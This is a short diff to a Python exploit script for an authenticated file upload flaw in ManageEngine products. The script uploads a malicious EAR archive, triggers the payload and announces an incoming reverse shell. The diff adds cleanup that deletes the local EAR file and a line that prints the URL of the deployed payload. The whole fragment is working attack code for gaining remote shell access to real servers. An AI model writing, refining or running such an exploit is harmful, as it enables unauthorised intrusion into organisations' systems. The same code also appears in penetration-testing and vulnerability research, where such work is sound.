@@ -6,6 +6,7 @@ import zipfile
 from requests_toolbelt import MultipartEncoder
 import string
 import random
+import os
 
 def banner():
     print("""# ManageEngine Multiple Products Authenticated File Upload
@@ -163,6 +164,7 @@ def main():
         ear = open(ear_file_name + '.ear', 'rb')
         ear_file = ear.read()
         ear.close()
+        os.remove(ear_file_name + '.ear')
         cookie, text, status = upload_request(cookie, target_uri, payload_name + '.ear', ear_file)
 
         if status == 200:
@@ -180,6 +182,8 @@ def main():
         for i in range(10):
             if run_payload(target_uri, ear_app_base, war_app_base, rts7) == 200:
                 print("[+] Hurray! Incoming reverse shell!")
+                print("[+] Check here: " + target_uri + ear_app_base + "/" + war_app_base + "/" + rts7)
+
                 sys.exit(0)
             else:
                 rts7 = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(9))
